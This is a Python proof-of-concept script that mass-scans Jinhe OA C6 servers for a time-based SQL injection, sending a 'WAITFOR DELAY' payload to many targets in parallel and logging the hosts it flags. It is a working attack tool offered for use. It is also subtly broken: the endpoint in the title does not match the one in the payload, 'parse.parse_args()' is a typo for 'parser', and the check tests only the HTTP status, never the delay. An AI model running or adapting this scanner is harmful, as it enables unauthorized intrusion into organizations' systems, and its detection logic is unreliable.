#金和OA_C6-GetSgIData.aspx_SQL注入漏洞
import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
                                   author:MOYV                                                                                                                                    
"""
    print(test)

def poc(target):
    api_payload = "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1"
    try:
        res = requests.post(url=target+api_payload,verify=False,timeout=10)
        if res.status_code==200:
            print(f"[+]{target}存在SQL注入")
            with open('result.txt','a') as f:
                f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parser = argparse.ArgumentParser(description="金和OA_C6-GetSgIData.aspx_SQL注入漏洞脚本")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()